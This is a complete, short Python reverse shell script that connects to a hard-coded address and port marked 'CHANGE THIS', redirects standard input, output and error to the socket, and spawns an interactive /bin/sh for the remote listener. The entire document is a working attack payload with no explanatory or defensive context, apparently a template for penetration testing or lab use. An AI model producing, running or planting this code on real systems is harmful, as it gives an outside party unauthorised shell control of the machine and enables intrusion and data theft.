import socket,os,pty
IP = "192.168.56.1"  # CHANGE THIS
PORT = 1234  # CHANGE THIS
s = socket.socket(); 
s.connect((IP,PORT))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/sh")
